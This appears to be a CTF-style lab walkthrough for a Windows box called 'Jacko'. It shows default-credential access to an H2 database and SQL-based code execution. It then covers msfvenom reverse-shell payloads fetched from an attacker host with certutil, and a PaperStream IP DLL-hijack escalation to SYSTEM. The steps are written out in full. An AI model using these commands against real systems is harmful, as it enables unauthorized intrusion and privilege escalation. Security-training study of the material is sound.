_____

# Exploitation Guide for Jacko

## Summary

We discover a misconfigured H2 database with default credentials running on this machine. We'll exploit this misconfiguration to gain command execution. Finally, we'll escalate our privileges by exploiting a DLL hijacking vulnerability in Fujitsu's Paperstream IP program.

## Enumeration

### Nmap

We'll begin with an `nmap` scan.

```
kali@kali:~$ sudo nmap 192.168.140.66
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-05 06:35 EST
Nmap scan report for 192.168.140.66
Host is up (0.32s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8082/tcp open  blackice-alerts

Nmap done: 1 IP address (1 host up) scanned in 20.08 seconds
```

### H2 Database

Port 8082 is serving a web interface for an H2 database. In the [quickstart section of the H2 documentation](http://www.h2database.com/html/quickstart.html), we find that the default username is `sa` with a blank password. We're able to log in with these credentials and execute SQL queries.

## Exploitation

### H2 Database Code Execution

We find [this exploit](https://www.exploit-db.com/exploits/49384) on EDB that describes how to achieve remote code execution on H2 without JDK installed on the target machine. As detailed in the exploit, we'll first execute the SQL statement to write our DLL to the **C:\Windows\Temp** directory.

```
SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),...,'"'), 'ISO-8859-1', '', '', '', '', '');
```

Next, we'll run the following SQL commands to load our DLL and create an alias for it:

```
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');
```

Finally, we can run the following statements to achieve command execution:

```sql
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
desktop-cmvk5k4\tony
```

### H2 Database Reverse Shell

Now let's try to pivot this into a reverse shell. To do this, we'll first generate an MSFVenom reverse shell payload.

```
kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.118.3 LPORT=8082
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

Next, we'll host this payload over HTTP.

```
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Let's start a Netcat handler to catch our shell.

```
kali@kali:~$ nc -lvp 8082
listening on [any] 8082 ...
```

To trigger our shell, we'll run the following SQL statement to download our payload to the target machine:

```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.118.3/shell.exe C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');
```

We can now execute our payload with the following SQL statement:

```
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Windows/Temp/shell.exe").getInputStream()).useDelimiter("\\Z").next()');
```

Finally, we catch our reverse shell. We'll also fix our `PATH` variable so that we can execute some common commands.

```
kali@kali:~$ nc -lvp 8082
listening on [any] 8082 ...
192.168.140.66: inverse host lookup failed: Unknown host
connect to [KALI] from (UNKNOWN) [192.168.140.66] 49813
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\H2\service>set PATH=%SystemRoot%\system32;%SystemRoot%;
set PATH=%SystemRoot%\system32;%SystemRoot%;

C:\Program Files (x86)\H2\service>whoami
whoami
jacko\tony
```

## Escalation

### Service Enumeration

Within **C:\Program Files (x86)**, we find an interesting program: **PaperStream IP**.

```
C:\Program Files (x86)\H2\service>dir "C:\Program Files (x86)"
dir "C:\Program Files (x86)"
 Volume in drive C has no label.
 Volume Serial Number is AC2F-6399

 Directory of C:\Program Files (x86)

04/27/2020  08:01 PM    <DIR>          .
04/27/2020  08:01 PM    <DIR>          ..
04/27/2020  07:59 PM    <DIR>          Common Files
04/27/2020  08:01 PM    <DIR>          fiScanner
04/27/2020  07:59 PM    <DIR>          H2
04/24/2020  08:50 AM    <DIR>          Internet Explorer
03/18/2019  08:52 PM    <DIR>          Microsoft.NET
04/27/2020  08:01 PM    <DIR>          PaperStream IP
03/18/2019  10:20 PM    <DIR>          Windows Defender
03/18/2019  08:52 PM    <DIR>          Windows Mail
04/24/2020  08:50 AM    <DIR>          Windows Media Player
03/18/2019  10:23 PM    <DIR>          Windows Multimedia Platform
03/18/2019  09:02 PM    <DIR>          Windows NT
03/18/2019  10:23 PM    <DIR>          Windows Photo Viewer
03/18/2019  10:23 PM    <DIR>          Windows Portable Devices
03/18/2019  08:52 PM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              16 Dir(s)   6,925,905,920 bytes free
```

The **readmeenu.rtf** file contains the version information.

```
C:\Program Files (x86)\H2\service> type "C:\Program Files (x86)\PaperStream IP\TWAIN\readmeenu.rtf"
{\rtf1\ansi\ansicpg932\deff0\deflang1033\deflangfe1041{\fonttbl{\f0\fnil\fcharset0 Microsoft Sans Serif;}{\f1\fswiss\fprq2\fcharset0 Microsoft Sans Serif;}}
{\colortbl ;\red0\green0\blue0;}
{\*\generator Msftedit 5.41.21.2510;}\viewkind4\uc1\pard\nowidctlpar\sl276\slmult1\f0\fs18 ---------------------------------------------------------------------------------------------------------\par
fi Series\par
PaperStream IP driver 1.42\par
README file\par
---------------------------------------------------------------------------------------------------------\par
Copyright PFU LIMITED 2013-2016\par
\par
\par
This file includes important notes on this product and also the additional information not included in the manuals.\par
\par
---------------------------------------------------------------------------------------------------------\par
```

### PaperStream IP Exploitation

Searching EDB for this program and version information, we discover [CVE-2018-16156](https://www.exploit-db.com/exploits/49382). To exploit this, we'll first generate a reverse shell payload.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.118.3 LPORT=8082
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 5120 bytes
Saved as: shell.dll
```

We'll then host our malicious DLL and the PaperStream exploit over HTTP.

```
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We can now download them to the target machine.

```
C:\Program Files (x86)\H2\service>cd \Windows\Temp
cd \Windows\Temp

C:\Windows\Temp>certutil -urlcache -split -f http://192.168.118.3/shell.dll shell.dll
certutil -urlcache -split -f http://192.168.118.3/shell.dll shell.dll
****  Online  ****
  0000  ...
  1400
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp>certutil -urlcache -split -f http://192.168.118.3/exploit.ps1 exploit.ps1
certutil -urlcache -split -f http://192.168.118.3/exploit.ps1 exploit.ps1
****  Online  ****
  0000  ...
  0937
CertUtil: -URLCache command completed successfully.
```

Next, we'll start a Netcat handler to catch our reverse shell.

```
kali@kali:~$ nc -lvp 8082
listening on [any] 8082 ...
```

Let's run our exploit.

```
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe C:\Windows\Temp\exploit.ps1
Writable location found, copying payload to C:\JavaTemp\
Payload copied, triggering...
```

If all goes as planned, we'll catch our reverse shell as `nt authority\system`.

```
kali@kali:~$ nc -lvp 8082
listening on [any] 8082 ...
192.168.179.66: inverse host lookup failed: Host name lookup failure
connect to [KALI] from (UNKNOWN) [192.168.179.66] 49883
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
